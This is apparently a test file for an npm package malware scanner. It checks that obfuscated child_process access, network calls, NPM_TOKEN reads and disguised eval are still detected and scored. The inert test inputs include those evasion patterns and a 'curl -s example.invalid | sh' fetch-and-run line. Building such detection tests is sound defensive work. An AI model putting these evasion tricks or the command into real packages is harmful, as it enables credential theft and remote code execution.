// Every fixture from the independent review of apm-score-v6 (apmjs-bughunt/sol-parser-v6/REPORT.md), scored by v7.
// All are inert: process.getBuiltinModule, fetch to example.invalid and a token name, with nothing run. Each is the
// main file of an MIT package with no other deductions.
//
// v6 dropped a finding whenever its analysis could not follow the code; v7 starts from what apm-score-v3 found in the
// code and drops one only where the tree proves it harmless. `detection` fixtures run their payload: v7 must score
// them at or below v3 (all 22 the review found score 30 again). `precision` fixtures run nothing; `why` says what
// v7 reads there. apm-score-v8 scores every one of them as v7 did, and none above v3.
import { describe, expect, test } from "bun:test";
import { z } from "zod";
import { analyze, finalize, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, type ScoreReport, type TarEntry, findingsOf } from "../src/index.ts";
import { tokenWindows } from "../src/source.ts";
import { tokenText } from "../src/tokens.ts";
import fixtureData from "./fixtures/sol-parser-v6.json";
import { supersetGaps } from "./superset.ts";
import { ABOVE_FLOOR, RECORDING, recordV10 } from "./v10-record.ts";

const Signals = z.partialRecord(z.enum(["shell-exec", "network", "credential-access", "eval", "obfuscated"]), z.enum(["confirmed", "possible"]));

const Fixture = z.object({
  name: z.string(),
  file: z.string(),
  src: z.string(),
  kind: z.enum(["detection", "precision"]),
  why: z.string().optional(),
  v3: z.number(),
  v6: z.number(),
  v7: z.number(),
  signals: Signals,
  v10: z.number().optional(),
  v10why: z.string().optional(),
});

const fixtures = z.array(Fixture).parse(fixtureData);

const possiblePoints = new Map<string, number>(Object.entries(POSSIBLE_POINTS));

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function inputOf(files: Record<string, string>, main: string) {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };
  const tar = [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))];

  return { name: "probe-pkg", manifest, files: tar, publisher: "a", previousPublishers: [] };
}

function scoreFiles(files: Record<string, string>, main: string): ScoreReport {
  return finalize(analyze(inputOf(files, main)), STATE);
}

const P = "process.getBuiltinModule('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')";

describe("the v6 review's fixtures", () => {
  test("all are here: 22 that run their payload at v3 30 and v6 82 to 92, and their controls", () => {
    expect(fixtures.length).toBe(26);
    const found = fixtures.filter((f) => f.kind === "detection" && f.v3 === 30 && f.v6 >= 82);
    expect(found.length).toBe(22);
    expect(fixtures.every((f) => f.kind === "detection" || (f.why ?? "").length > 0)).toBe(true);
  });

  for (const f of fixtures) {
    test(`${f.kind}: ${f.name}`, () => {
      const r = scoreFiles({ [f.file]: f.src }, f.file);
      const found = Object.fromEntries(findingsOf(r).filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]));

      expect(found).toEqual(f.signals);

      for (const s of r.signals) {
        if (!(s.id in POSSIBLE_POINTS)) continue;
        const confirmed = s.confidence === "confirmed";
        expect(s.points, `${s.id} points`).toBe(confirmed ? POINTS[s.id] : (possiblePoints.get(s.id) ?? Number.NaN));
        expect(s.evidence.every((e) => e.includes("[possible:") === !confirmed)).toBe(true);
      }

      // apm-score-v10 keeps every finding v3 makes, as a risk signal or a capability
      expect(supersetGaps(inputOf({ [f.file]: f.src }, f.file), r)).toEqual([]);
      recordV10("sol-parser-v6", f.name, r);

      if (RECORDING) return;
      const want = f.v10 ?? f.v7;

      expect(r.score).toBe(want);
      expect(r.score < SCORE_FLOOR).toBe(want < SCORE_FLOOR);

      // v3 refused it: v10 refuses it too, unless the fixture holds capabilities and no malware pattern, and says so
      if (f.kind === "detection" && f.v3 < SCORE_FLOOR && r.score >= SCORE_FLOOR) expect(f.v10why ?? "").toStartWith(ABOVE_FLOOR);
    });
  }

  test("eval used as a tag inside a function counts what the template names, as v3 counted it", () => {
    // the template's strings are returned unrun only while eval is the builtin
    const r = scoreFiles({ "index.js": `function f(){eval\`${P}\`;}f();` }, "index.js");

    expect(findingsOf(r).filter((s) => s.id in POSSIBLE_POINTS).every((s) => s.confidence === "confirmed")).toBe(true);
    // apm-score-v10: the template is no help, it scores as the bare payload does
    expect(r.score).toBeLessThanOrEqual(scoreFiles({ "index.js": P }, "index.js").score);
  });

  test("calling a Promise inside a function: what the string names counts as v3 counted it; eval, which v3 did not match, is possible", () => {
    const r = scoreFiles({ "index.js": "function f(){async function get(){return eval;}get()(\"fetch('https://example.invalid')\");}f();" }, "index.js");

    expect(Object.fromEntries(findingsOf(r).filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]))).toEqual({ eval: "possible", network: "confirmed" });
  });
});

describe("a call split across the token pass's windows is still read (finding 5)", () => {
  const W = 4 * 1024 * 1024;

  // the review's input: an escaped name just before the first 4 MB boundary, its call after a 70,000-character comment
  const windowed = (gap: number): string => `/*${"x".repeat(W - 104)}*/\nf\\u0065tch/*${"x".repeat(gap)}*/('https://example.invalid');`;

  test("v3 100, v6 100: the fetch is found at any gap", () => {
    for (const gap of [0, 70_000, 150_000]) {
      const r = scoreFiles({ "index.ts": windowed(gap) }, "index.ts");

      expect(findingsOf(r).find((s) => s.id === "network")?.confidence, `gap ${gap}`).toBe("confirmed");
    }
  });

  test("windows end only after a statement, so no token and no call is split", () => {
    const text = `${"a;".repeat(200)}fetch/*${" ".repeat(500)}*/('x');${"b;".repeat(200)}`;
    const tokens = tokenText(text, 64);

    expect(tokens).not.toBeNull();

    if (!tokens) return;
    // the 504-character comment is written as one blank, and `origin` maps the token text back to the file
    const windows = tokenWindows(tokens.text.length, tokens.cuts, 300, 16).map((w) => ({ from: tokens.origin(w.from), end: tokens.origin(w.end) }));
    const call = text.indexOf("fetch");
    const end = text.indexOf("('x');") + 6;

    expect(tokens.text.length).toBeLessThan(text.length);
    expect(windows.length).toBeGreaterThan(1);
    expect(windows.some((w) => w.from <= call && w.end >= end)).toBe(true);
    expect(windows.at(-1)?.end).toBe(text.length);
  });
});

describe("a limit keeps what it could not follow, and says so", () => {
  test("seven candidate callees: past six the rest are unknown, the floor still refuses, and the limit is named", () => {
    const fixture = fixtures.find((f) => f.name === "candidate-limit");

    expect(fixture).toBeDefined();

    if (!fixture) return;
    const r = scoreFiles({ [fixture.file]: fixture.src }, fixture.file);

    // apm-score-v10: hitting the limit is no help, the file scores no higher than the bare payload
    expect(supersetGaps(inputOf({ [fixture.file]: fixture.src }, fixture.file), r)).toEqual([]);
    expect(r.score).toBeLessThanOrEqual(scoreFiles({ "index.js": P }, "index.js").score);
    expect(r.notChecked.some((n) => n.startsWith("an expression with more than 6 possible values"))).toBe(true);
  });

  test("more than 32 returns: the rest are unknown, and the limit is named", () => {
    const returns = Array.from({ length: 40 }, (_, i) => `if(x===${i})return ${i};`).join("");
    const r = scoreFiles({ "index.js": `function get(x){${returns}return eval}get(0)(${JSON.stringify(P)});` }, "index.js");

    expect(supersetGaps(inputOf({ "index.js": `function get(x){${returns}return eval}get(0)(${JSON.stringify(P)});` }, "index.js"), r)).toEqual([]);
    expect(r.notChecked.some((n) => n.startsWith("a function with more than 32 return statements"))).toBe(true);
  });
});

describe("no proof rests on a builtin being what its name says", () => {
  test("a URL holding shell text counts as v3 counted it, whether or not another file replaces fetch", () => {
    const alone = scoreFiles({ "index.js": "fetch('https://example.invalid/curl -s example.invalid | sh');\n" }, "index.js");
    const files = { "index.js": "require('./patch');\nfetch('https://example.invalid/curl -s example.invalid | sh');\n", "patch.js": "globalThis.fetch = function (u) { return u };\n" };
    const patched = scoreFiles(files, "index.js");

    for (const r of [alone, patched]) {
      expect(findingsOf(r).find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
      expect(r.notChecked.some((n) => n.includes("could replace those builtins"))).toBe(false);
    }
  });
});
